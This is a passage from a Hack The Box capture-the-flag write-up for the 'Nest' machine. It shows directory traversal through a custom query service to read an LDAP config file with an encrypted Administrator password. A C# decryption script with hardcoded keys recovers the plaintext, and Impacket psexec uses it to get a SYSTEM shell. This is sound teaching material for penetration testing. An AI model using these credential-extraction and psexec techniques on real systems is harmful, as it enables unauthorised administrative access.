Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
```
OK, now that we have `<Query_ID>`s, let's try `SHOWQUERY`:
```
>showquery 1

TITLE=Invoices (Ordered By Customer)
QUERY_MODE=VIEW
QUERY_TYPE=INVOICE
SORTBY=CUSTOMER
DATERANGE=ALL
```
At this point, I'd spent a bit of time trying to learn how to construct new HQL queries, when I realized there’s more enumeration possible with the `SETDIR` command. The key is that the `LIST` command seems to just list files in the current directory, and the `SHOWQUERY` command executes / shows the contents of the files. That means I’m in some sort of 'shell' that only allows me to read files. Let's try to experiment - let's try `SETDIR` to `..`:
```
>setdir ..

Current directory set to HQK
```
Let's see the contents of `HQK` directory with `LIST`:
```
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
```
We see `LDAP` - since our clues have been pointing there so far (our first discovered credentials were for LDAP), let's go inside:
```
>setdir LDAP

Current directory set to LDAP
```
`LIST` the contents:
```
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
```
We've got a `conf` file - that's always interesting. Let's take a look:
```
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```
Hah! We've got `Administrator`'s encrypted password, and it looks like it's encrypted in the same format as the one we found for `Carl` earlier (we can easily check by counting the number of characters with `wc -c <encrypted password`).
  
  
Let's fix our script to contain `Administrator`'s encrypted password:
```
kali@kali:~/htb/boxes/nest/hqk$ cat decrypt.cs 
using System;
//using CascCrypto;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class HelloWorld {
  static void Main() {
    string str = string.Empty;
    //Console.WriteLine("Hello World!");
    string Pwd = "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=";
    string EncryptedString = Pwd;
    str = DecryptString(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
    Console.WriteLine(str);
  }
(..snip..)
```
Use `mono` again to compile and run the script:
```
kali@kali:~/htb/boxes/nest/hqk$ mcs -out:decrypt.exe decrypt.cs 
kali@kali:~/htb/boxes/nest/hqk$ mono decrypt.exe
XtH4nkS4Pl4y1nGX
```
Awesomesauce.

### Shell as Administrator
Since we now have `Administrator`, we can try `psexec`, since `Administrator` very likely has the write access on the SMB shares that `psexec` needs to open a shell:
```
kali@kali:~/htb/boxes/nest/hqk$ sudo psexec.py administrator:XtH4nkS4Pl4y1nGX@nest.htb
Impacket v0.9.21.dev1+20200225.153700.afe746d2 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on nest.htb.....
[*] Found writable share ADMIN$
[*] Uploading file hyqrdzFp.exe
[*] Opening SVCManager on nest.htb.....
[*] Creating service Rumw on nest.htb.....
[*] Starting service Rumw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
Now, did you think that was worth an easy rank on HTB??


